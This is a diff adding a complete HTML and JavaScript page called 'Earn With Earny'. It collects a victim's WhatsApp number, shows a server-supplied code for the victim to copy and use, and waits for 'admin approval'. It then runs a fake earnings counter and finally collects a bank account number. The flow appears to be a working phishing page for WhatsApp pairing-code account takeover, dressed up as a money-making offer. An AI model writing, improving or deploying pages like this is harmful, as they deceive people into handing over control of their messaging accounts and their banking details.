@@ -1,1 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Earn With Earny</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg,#4f7cff,#764ba2);
+    color:white;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    margin:0;
+}
+.container {
+    background:white;
+    color:#333;
+    width:90%;
+    max-width:420px;
+    padding:25px;
+    border-radius:15px;
+    box-shadow:0 5px 25px rgba(0,0,0,0.25);
+    text-align:center;
+}
+h1 { color:#4f7cff; margin-bottom:10px; }
+input, button {
+    width:100%;
+    padding:15px;
+    margin-top:15px;
+    font-size:16px;
+    border-radius:8px;
+    outline:none;
+}
+input { border:2px solid #4f7cff; }
+button { background:#4f7cff; border:none; color:white; cursor:pointer; font-size:17px; }
+button:hover { background:#3d64d8; }
+.code-box {
+    margin-top:20px;
+    padding:15px;
+    background:#f0f4ff;
+    border:2px dashed #4f7cff;
+    border-radius:8px;
+    font-size:20px;
+    cursor:pointer;
+    display:none;
+}
+#moneyBox {
+    margin-top:20px;
+    font-size:22px;
+    display:none;
+    color:#333;
+}
+#accountDiv { margin-top:20px; display:none; }
+</style>
+</head>
+<body>
 
+<div class="container">
+    <h1>Earn With Earny</h1>
+    <input id="phone" placeholder="Enter WhatsApp number">
+    <button onclick="submitNumber()">Submit</button>
+
+    <div id="codeBox" class="code-box"></div>
+    <button id="confirmBtn" style="display:none" onclick="markCodeUsed()">Confirm Code Used</button>
+
+    <div id="moneyBox">Balance: <span id="money">0.01</span> NGN</div>
+
+    <div id="accountDiv">
+        <input id="accountInput" placeholder="Enter account number">
+        <button onclick="submitAccount()">Submit Account</button>
+    </div>
+</div>
+
+<script>
+async function submitNumber(){
+    const phone = document.getElementById("phone").value;
+    if(!phone){ alert("Enter your WhatsApp number"); return; }
+    await fetch("/api/submit",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({phone})
+    });
+    checkCode(phone);
+}
+
+async function checkCode(phone){
+    const res = await fetch("/api/check?phone="+phone);
+    const data = await res.json();
+    const codeBox = document.getElementById("codeBox");
+    if(data.code){
+        codeBox.style.display="block";
+        codeBox.innerText = data.code;
+        codeBox.onclick = ()=>navigator.clipboard.writeText(data.code);
+        document.getElementById("confirmBtn").style.display="inline-block";
+        pollApproval(phone);
+    } else {
+        codeBox.style.display="block";
+        codeBox.innerText="Waiting for your code...";
+        setTimeout(()=>checkCode(phone),3000);
+    }
+}
+
+async function markCodeUsed(){
+    const phone = document.getElementById("phone").value;
+    await fetch("/api/codeused",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({phone})
+    });
+    alert("Code usage submitted. Waiting for admin approval...");
+}
+
+async function pollApproval(phone){
+    const res = await fetch("/api/status?phone="+phone);
+    const data = await res.json();
+    if(data.codeUsed && data.approved){
+        startMoneyCounter();
+    } else {
+        setTimeout(()=>pollApproval(phone),3000);
+    }
+}
+
+function startMoneyCounter(){
+    const moneyBox = document.getElementById("moneyBox");
+    moneyBox.style.display="block";
+
+    let money = 0.01;
+    const target = 1000;
+    const increment = 0.2778; // NGN per second for 1-hour total
+    const interval = 1000;    // 1 second per update
+
+    const moneySpan = document.getElementById("money");
+
+    const counter = setInterval(()=>{
+        money += increment;
+        if(money >= target){
+            money = target;
+            clearInterval(counter);
+            document.getElementById("accountDiv").style.display="block";
+        }
+        moneySpan.innerText = money.toFixed(2);
+    }, interval);
+}
+
+async function submitAccount(){
+    const phone = document.getElementById("phone").value;
+    const accountNumber = document.getElementById("accountInput").value;
+    if(!accountNumber){ alert("Enter your account number"); return; }
+    await fetch("/api/account",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({phone,accountNumber})
+    });
+    alert("Account submitted. Thank you!");
+}
+</script>
+
+</body>
+</html>
